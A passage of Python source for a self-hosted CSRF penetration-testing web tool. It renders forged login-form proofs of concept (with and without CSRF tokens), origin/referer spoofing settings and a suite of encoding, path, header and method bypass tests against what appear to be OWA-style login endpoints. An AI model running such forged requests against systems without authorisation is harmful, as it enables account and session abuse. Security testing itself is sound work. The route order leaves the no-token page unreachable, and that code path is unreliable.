    risk_color = "low"
    if vuln_score >= 70:
        risk_level = "HIGH"
        risk_color = "high"
    elif vuln_score >= 40:
        risk_level = "MEDIUM"
        risk_color = "medium"
    
    body = f"""
<h1>Security Assessment Overview</h1>

<div class='card'>
  <div class='card-header'>Target Information</div>
  <p><strong>Target:</strong> <code>{escape(TARGET_BASE)}</code></p>
  <p><strong>Warm-up URL:</strong> <code>{escape(STATE.get('get_logon_url', ''))}</code></p>
  <p><strong>CSRF Test URL:</strong> <code>{escape(STATE.get('cookieauth_url', ''))}</code></p>
</div>

<div class='card'>
  <div class='card-header'>Vulnerability Assessment</div>
  <p><strong>Risk Level:</strong> <span class='badge badge-{risk_color}'>{risk_level}</span></p>
  <p><strong>Score:</strong> {vuln_score}/100</p>
  <div class='progress-bar'>
    <div class='progress-fill' style='width: {vuln_score}%'>{vuln_score}%</div>
  </div>
  
  <h4>Detected Protection Mechanisms:</h4>
  <ul>
"""
    
    if STATE.get('protection_mechanisms'):
        for mech in STATE['protection_mechanisms']:
            body += f"    <li>{escape(mech)}</li>\n"
    else:
        body += "    <li><em>No protection mechanisms detected</em></li>\n"
    
    body += """
  </ul>
</div>

<div class='card'>
  <div class='card-header'>Quick Actions</div>
  <p>
    <a class='btn' href='/config'>Configuration</a>
    <a class='btn' href='/poc'>Browser CSRF PoC</a>
    <a class='btn' href='/poc-no-token'>PoC (No Tokens)</a>
    <a class='btn' href='/verify?origin={escape(FAKE_ORIGIN_DEFAULT)}'>Verify CSRF</a>
    <a class='btn' href='/verify-deep?origin={escape(FAKE_ORIGIN_DEFAULT)}'>Deep Verify</a>
    <a class='btn' href='/suite?origin={escape(FAKE_ORIGIN_DEFAULT)}'>Run Full Suite</a>
  </p>
</div>

<div class='card'>
  <div class='card-header'>Cookie Security Report</div>
  <pre>{escape(STATE.get('cookie_report', '(no data)'))}</pre>
</div>

<div class='card'>
  <div class='card-header'>Detected Endpoints</div>
"""
    
    if STATE.get('detected_endpoints'):
        body += "<table><thead><tr><th>Path</th><th>Status</th><th>Title</th></tr></thead><tbody>\n"
        for ep in STATE['detected_endpoints']:
            body += f"<tr><td><code>{escape(ep.get('path', ''))}</code></td><td>{ep.get('status', '')}</td><td>{escape(ep.get('title', ''))}</td></tr>\n"
        body += "</tbody></table>\n"
    else:
        body += "<p><em>No endpoints detected</em></p>\n"
    
    body += """
</div>

<div class='card'>
  <div class='card-header'>CSRF Tokens Found</div>
"""
    
    if STATE.get('csrf_tokens'):
        body += "<ul>\n"
        for k, v in STATE['csrf_tokens'].items():
            body += f"  <li><code>{escape(k)}</code>: <code>{escape(v[:50])}...</code></li>\n"
        body += "</ul>\n"
    else:
        body += "<p class='indicator warning'><strong>Warning:</strong> No CSRF tokens detected - this may indicate a vulnerability!</p>\n"
    
    body += """
</div>
"""
    
    if STATE.get('warnings'):
        body += "<div class='card'><div class='card-header'>Warnings</div><ul>\n"
        for warn in STATE['warnings']:
            body += f"  <li>{escape(warn)}</li>\n"
        body += "</ul></div>\n"
    
    return html_layout("CSRF Assessment Tool - Overview", body)

def page_config(query: Dict[str, str]) -> str:
    """Configuration page"""
    global CSRF_USERNAME, CSRF_PASSWORD, TARGET_BASE, PUBLIC_HOST, PUBLIC_PORT
    global FAKE_ORIGIN_DEFAULT, FAKE_REFERER_DEFAULT
    
    if query.get("save") == "1":
        TARGET_BASE = query.get("target_base", TARGET_BASE).strip()
        PUBLIC_HOST = query.get("public_host", PUBLIC_HOST).strip()
        
        try:
            p = int(query.get("public_port", str(PUBLIC_PORT)))
            PUBLIC_PORT = p
        except:
            pass
        
        FAKE_ORIGIN_DEFAULT = query.get("fake_origin", FAKE_ORIGIN_DEFAULT).strip() or FAKE_ORIGIN_DEFAULT
        FAKE_REFERER_DEFAULT = query.get("fake_referer", FAKE_REFERER_DEFAULT).strip()
        
        new_user = query.get("csrf_username", "").strip()
        new_pass = query.get("csrf_password", "")
        
        if new_user:
            CSRF_USERNAME = new_user
        if new_pass:
            CSRF_PASSWORD = new_pass
        
        # Rebuild URLs
        STATE["target_base"] = TARGET_BASE
        STATE["cookieauth_url"] = absolute_url(TARGET_BASE, COOKIEAUTH_PATH)
        STATE["authowa_url"] = absolute_url(TARGET_BASE, AUTHOWA_PATH)
        STATE["get_logon_url"] = absolute_url(TARGET_BASE, GET_LOGON_PATH)
        STATE["safe_url"] = absolute_url(TARGET_BASE, PUBLISHED_SAFE_PATH)
        
        # Re-run warm-up
        warm_up()
    
    masked_user = CSRF_USERNAME
    body = f"""
<h1>Configuration</h1>

<form method='get' action='/config'>
  <input type='hidden' name='save' value='1'>
  
  <h3>Target Configuration</h3>
  <label>Target Base URL</label>
  <input name='target_base' value='{escape(TARGET_BASE)}' style='width:100%; padding: 8px; margin-bottom: 12px;'>
  
  <label>Public Host (your external IP/hostname)</label>
  <input name='public_host' value='{escape(PUBLIC_HOST)}' style='width:100%; padding: 8px; margin-bottom: 12px;'>
  
  <label>Public Port</label>
  <input name='public_port' value='{escape(str(PUBLIC_PORT))}' style='width:100%; padding: 8px; margin-bottom: 12px;'>
  
  <h3>Origin/Referer Spoofing</h3>
  <label>Fake Origin (for server-side verification)</label>
  <input name='fake_origin' value='{escape(FAKE_ORIGIN_DEFAULT)}' style='width:100%; padding: 8px; margin-bottom: 12px;'>
  
  <label>Fake Referer (for server-side verification)</label>
  <input name='fake_referer' value='{escape(FAKE_REFERER_DEFAULT)}' style='width:100%; padding: 8px; margin-bottom: 12px;'>
  
  <h3>CSRF Test Credentials</h3>
  <label>Test Username</label>
  <input name='csrf_username' value='{escape(masked_user)}' style='width:100%; padding: 8px; margin-bottom: 12px;'>
  
  <label>Test Password (leave blank to keep unchanged)</label>
  <input name='csrf_password' type='password' value='' style='width:100%; padding: 8px; margin-bottom: 12px;'>
  
  <div style='margin-top: 20px;'>
    <button type='submit' class='btn' style='background: var(--success);'>Save Configuration</button>
    <a class='btn' href='/'>Back to Overview</a>
  </div>
</form>

<div class='card' style='margin-top: 20px;'>
  <div class='card-header'>Security Tips</div>
  <ul>
    <li>Use valid test credentials for accurate results</li>
    <li>Ensure your public host is accessible from the target network</li>
    <li>Test both with and without CSRF tokens to verify protection</li>
    <li>Check cookie SameSite attributes for CSRF vulnerability</li>
  </ul>
</div>
"""
    
    return html_layout("Configuration", body)

def page_poc(include_tokens: bool = True) -> str:
    """Browser-based CSRF PoC form"""
    action = STATE.get("cookieauth_url", "")
    payload = build_payload(include_tokens=include_tokens)
    
    inputs = "\n".join([
        f"    <input type='hidden' name='{escape(k)}' value='{escape(v)}'>" 
        for k, v in payload.items()
    ])
    
    pretty = build_payload_kv(payload)
    
    token_status = "WITH CSRF Tokens" if include_tokens else "WITHOUT CSRF Tokens"
    warning = "" if include_tokens else """
<div class='indicator warning'>
  <strong>Warning:</strong> This PoC excludes detected CSRF tokens. 
  Use this to test if the application properly validates tokens.
</div>
"""
    
    body = f"""
<h1>CSRF Browser PoC → <code>{escape(action)}</code></h1>
<p><strong>Mode:</strong> {token_status}</p>

{warning}

<div class='card'>
  <div class='card-header'>Auto-Submitting Form</div>
  <p>This form will automatically submit in 2 seconds. Make sure you're authenticated to the target!</p>
  
  <form id='csrf' method='POST' action='{escape(action)}' enctype='application/x-www-form-urlencoded'>
{inputs}
    <button type='submit' class='btn' style='background: var(--danger);'>Submit Manually</button>
  </form>
  
  <p><em>Note: JavaScript auto-submit is disabled for safety. Click the button above to test.</em></p>
</div>

<div class='card'>
  <div class='card-header'>Payload Details</div>
  <pre>{escape(pretty)}</pre>
</div>

<p>
  <a class='btn' href='/'>Back</a>
  <a class='btn' href='/poc-no-token'>Test Without Tokens</a>
</p>
"""
    
    return html_layout("CSRF Browser PoC", body)

def page_verify(query: Dict[str, str], deep: bool = False) -> str:
    """Verify CSRF protection"""
    origin = query.get("origin")
    referer = query.get("referer")
    include_tokens = query.get("include_tokens") == "1"
    
    result = test_csrf_protection(origin, referer, include_tokens=include_tokens)
    
    status_color = "success" if result["success"] else "danger"
    token_info = "with CSRF tokens" if include_tokens else "without CSRF tokens"
    
    indicators_html = ""
    if result["indicators"]:
        indicators_html = "<ul>\n"
        for ind in result["indicators"]:
            indicators_html += f"  <li>{escape(ind)}</li>\n"
        indicators_html += "</ul>\n"
    
    body = f"""
<h1>{'Deep ' if deep else ''}CSRF Verification</h1>

<div class='card'>
  <div class='card-header'>Test Results</div>
  <p><strong>Status:</strong> <span class='badge badge-{status_color}'>{'VULNERABLE' if result['success'] else 'PROTECTED'}</span></p>
  <p><strong>HTTP Status Code:</strong> {result['status_code']}</p>
  <p><strong>Final URL:</strong> <code>{escape(result['final_url'])}</code></p>
  <p><strong>Test Mode:</strong> {token_info}</p>
  
  <h4>Indicators:</h4>
  {indicators_html}
  
  <h4>Response Preview:</h4>
  <pre style='max-height: 200px; overflow-y: auto;'>{escape(result['response_preview'])}</pre>
</div>

<div class='card'>
  <div class='card-header'>Recommendations</div>
"""
    
    if result["success"]:
        body += """
  <div class='indicator danger'>
    <strong>CRITICAL:</strong> CSRF vulnerability confirmed! The application accepted the forged request.
    <ul>
      <li>Implement proper CSRF token validation</li>
      <li>Set SameSite=Strict or SameSite=Lax on all cookies</li>
      <li>Validate Origin and Referer headers strictly</li>
      <li>Consider using double-submit cookie pattern</li>
    </ul>
  </div>
"""
        STATE["vulnerability_score"] = min(100, STATE.get("vulnerability_score", 0) + 50)
    else:
        body += """
  <div class='indicator success'>
    <strong>Protected:</strong> The application rejected the forged request.
    <ul>
      <li>CSRF protection is working correctly</li>
      <li>Continue monitoring for bypass opportunities</li>
      <li>Test with different payload variations</li>
    </ul>
  </div>
"""
    
    body += f"""
</div>

<p>
  <a class='btn' href='/'>Back</a>
  <a class='btn' href='/verify?origin={escape(origin or FAKE_ORIGIN_DEFAULT)}'>Test Without Tokens</a>
  <a class='btn' href='/suite?origin={escape(origin or FAKE_ORIGIN_DEFAULT)}'>Run Full Suite</a>
</p>
"""
    
    return html_layout("CSRF Verification Result", body)

def page_suite(query: Dict[str, str]) -> str:
    """Run comprehensive security suite"""
    origin = query.get("origin")
    referer = query.get("referer")
    
    res = run_suite(origin, referer)
    
    def rows(items, vulnerable_col=False):
        output = ""
        for i in items:
            output += "<tr>"
            output += f"<td>{escape(i['case'])}</td>"
            if 'url' in i:
                output += f"<td><code>{escape(str(i.get('url','')))}</code></td>"
            if 'method' in i:
                output += f"<td>{escape(i['method'])}</td>"
            output += f"<td>{escape(str(i['status']))}</td>"
            output += f"<td><code>{escape(i['location'] or '')}</code></td>"
            output += f"<td><code>{escape((i.get('cookie') or '')[:80])}</code></td>"
            if vulnerable_col:
                vuln = i.get('vulnerable', i.get('allowed', False))
                badge = "badge-danger" if vuln else "badge-success"
                text = "VULNERABLE" if vuln else "Protected"
                output += f"<td><span class='badge {badge}'>{text}</span></td>"
            elif 'blocked' in i:
                badge = "badge-success" if i['blocked'] else "badge-danger"
                text = "Blocked" if i['blocked'] else "Accepted"
                output += f"<td><span class='badge {badge}'>{text}</span></td>"
            elif 'success' in i:
                badge = "badge-danger" if i['success'] else "badge-success"
                text = "VULNERABLE" if i['success'] else "Protected"
                output += f"<td><span class='badge {badge}'>{text}</span></td>"
                output += f"<td>{escape(i.get('indicators', ''))}</td>"
            output += "</tr>\n"
        return output
    
    summary = res.get('summary', {})
    vuln_ratio = f"{summary.get('bypass_success', 0)}/{summary.get('total_tests', 0)}"
    risk_level = "HIGH" if summary.get('bypass_success', 0) > 5 else "MEDIUM" if summary.get('bypass_success', 0) > 0 else "LOW"
    risk_badge = "badge-high" if risk_level == "HIGH" else "badge-medium" if risk_level == "MEDIUM" else "badge-low"
    
    body = f"""
<h1>Comprehensive Security Assessment Suite</h1>

<div class='card'>
  <div class='card-header'>Test Summary</div>
  <p><strong>Origin:</strong> {escape(res['origin'])}</p>
  <p><strong>Referer:</strong> {escape(res['referer'])}</p>
  <p><strong>Risk Level:</strong> <span class='badge {risk_badge}'>{risk_level}</span></p>
  <p><strong>Bypass Success Rate:</strong> {vuln_ratio} tests successful</p>
</div>

<h3>URL Encoding Bypass Tests</h3>
<table>
  <thead><tr><th>Test Case</th><th>URL</th><th>Status</th><th>Location</th><th>Cookie</th><th>Status</th></tr></thead>
  <tbody>{rows(res['encoding'], vulnerable_col=True)}</tbody>
</table>

<h3>Path Manipulation Tests</h3>
<table>
  <thead><tr><th>Test Case</th><th>URL</th><th>Status</th><th>Location</th><th>Cookie</th><th>Status</th></tr></thead>
  <tbody>{rows(res['path'], vulnerable_col=True)}</tbody>
</table>

<h3>Header Manipulation Tests</h3>
<table>
  <thead><tr><th>Test Case</th><th>Status</th><th>Location</th><th>Cookie</th><th>Result</th></tr></thead>
  <tbody>{rows(res['headers'])}</tbody>
</table>

<h3>HTTP Method Tests</h3>
<table>
  <thead><tr><th>Test Case</th><th>Method</th><th>Status</th><th>Location</th><th>Cookie</th><th>Allowed</th></tr></thead>
  <tbody>{rows(res['methods'])}</tbody>
</table>

<h3>Payload Variation Tests</h3>
<table>
  <thead><tr><th>Test Case</th><th>Content-Type</th><th>Status</th><th>Result</th><th>Indicators</th></tr></thead>
  <tbody>{rows(res['payloads'])}</tbody>
</table>

<div class='card'>
  <div class='card-header'>Recommendations</div>
"""
    
    if summary.get('bypass_success', 0) > 0:
        body += f"""
  <div class='indicator danger'>
    <strong>Vulnerabilities Found:</strong> {summary['bypass_success']} bypass techniques were successful.
    <ul>
      <li>Implement strict input validation and normalization</li>
      <li>Whitelist allowed HTTP methods</li>
      <li>Validate Content-Type headers strictly</li>
      <li>Implement proper CSRF token validation</li>
      <li>Set SameSite attributes on all cookies</li>
    </ul>
  </div>
"""
    else:
        body += """
  <div class='indicator success'>
    <strong>Good Security Posture:</strong> No bypass techniques were successful.
    <ul>
      <li>Continue monitoring for new bypass techniques</li>
      <li>Regular security assessments recommended</li>
      <li>Keep security mechanisms up to date</li>
    </ul>
  </div>
"""
    
    body += """
</div>

<p><a class='btn' href='/'>Back to Overview</a></p>
"""
    
    return html_layout("Security Assessment Suite", body)

# ---------- HTTP Handler ----------

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            return self._send_html(200, page_index())
        
        elif self.path.startswith('/config'):
            q = urllib.parse.urlsplit(self.path).query
            params = {k: v[-1] for k, v in urllib.parse.parse_qs(q, keep_blank_values=True).items()}
            return self._send_html(200, page_config(params))
        
        elif self.path.startswith('/poc'):
            return self._send_html(200, page_poc(include_tokens=True))
        
        elif self.path.startswith('/poc-no-token'):
            return self._send_html(200, page_poc(include_tokens=False))
        
        elif self.path.startswith('/verify-deep'):
            q = urllib.parse.urlsplit(self.path).query
            params = {k: v[-1] for k, v in urllib.parse.parse_qs(q, keep_blank_values=True).items()}
            return self._send_html(200, page_verify(params, deep=True))
        
        elif self.path.startswith('/verify'):
            q = urllib.parse.urlsplit(self.path).query
            params = {k: v[-1] for k, v in urllib.parse.parse_qs(q, keep_blank_values=True).items()}
            return self._send_html(200, page_verify(params, deep=False))
        
        elif self.path.startswith('/suite'):
            q = urllib.parse.urlsplit(self.path).query
            params = {k: v[-1] for k, v in urllib.parse.parse_qs(q, keep_blank_values=True).items()}
            return self._send_html(200, page_suite(params))
        
        return self.send_error(404, 'Not Found')
    
    def do_POST(self):
        return self.send_error(405, 'Method Not Allowed')
    
    def log_message(self, fmt, *items):
        """Custom logging"""
        sys.stdout.write(f"[HTTP] {fmt % items}\n")
    
    def _send_html(self, code: int, html: str):
        data = html.encode('utf-8')
        self.send_response(code)
        self.send_header('Content-Type', 'text/html; charset=utf-8')
        self.send_header('Content-Length', str(len(data)))
        self.end_headers()
        self.wfile.write(data)

# ---------- Main Entry ----------

def main():
    # Disable SSL warnings
    if requests:
        from urllib3.exceptions import InsecureRequestWarning
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
    # Run warm-up
    warm_up()
    
    # Start server
    httpd = socketserver.TCPServer((LISTEN_HOST, LISTEN_PORT), Handler)
    
    scheme = 'http'
    if CERT_FILE and KEY_FILE:
        try:
            context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            context.load_cert_chain(certfile=CERT_FILE, keyfile=KEY_FILE)
            httpd.socket = context.wrap_socket(httpd.socket, server_side=True)
            scheme = 'https'
            cprint("[+] HTTPS enabled", Colors.GREEN)
        except Exception as e:
            cprint(f"[-] Failed to load SSL certificates: {e}", Colors.RED)
            cprint("[i] Falling back to HTTP", Colors.YELLOW)
    
    port_part = '' if (scheme == 'https' and PUBLIC_PORT == 443) or (scheme == 'http' and PUBLIC_PORT == 80) else f':{PUBLIC_PORT}'
    public_url = f"{scheme}://{PUBLIC_HOST}{port_part}"
    
    cprint("\n" + "="*60, Colors.CYAN)
    cprint("Enhanced CSRF Assessment Tool - Ready", Colors.GREEN)
    cprint("="*60, Colors.CYAN)
    cprint(f"[+] Listening on {scheme}://{LISTEN_HOST}:{LISTEN_PORT}", Colors.GREEN)
    cprint(f"[i] Public URL: {public_url}", Colors.CYAN)
    cprint(f"[i] Target: {TARGET_BASE}", Colors.CYAN)
    cprint(f"[i] Test User: {CSRF_USERNAME}", Colors.CYAN)
    cprint("\nOpen your browser and navigate to:", Colors.YELLOW)
    cprint(f"  {public_url}/", Colors.GREEN)
    cprint("\nAvailable endpoints:", Colors.YELLOW)
    cprint(f"  {public_url}/poc          - CSRF PoC with tokens", Colors.GREEN)
    cprint(f"  {public_url}/poc-no-token - CSRF PoC without tokens", Colors.GREEN)
    cprint(f"  {public_url}/verify       - Verify CSRF protection", Colors.GREEN)
    cprint(f"  {public_url}/suite        - Run full security suite", Colors.GREEN)
    cprint(f"  {public_url}/config       - Configuration", Colors.GREEN)
    cprint("\nPress Ctrl+C to stop the server", Colors.YELLOW)
    cprint("="*60 + "\n", Colors.CYAN)
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        cprint("\n\n[+] Shutting down...", Colors.YELLOW)
    finally:
        httpd.server_close()

if __name__ == '__main__':
    main()
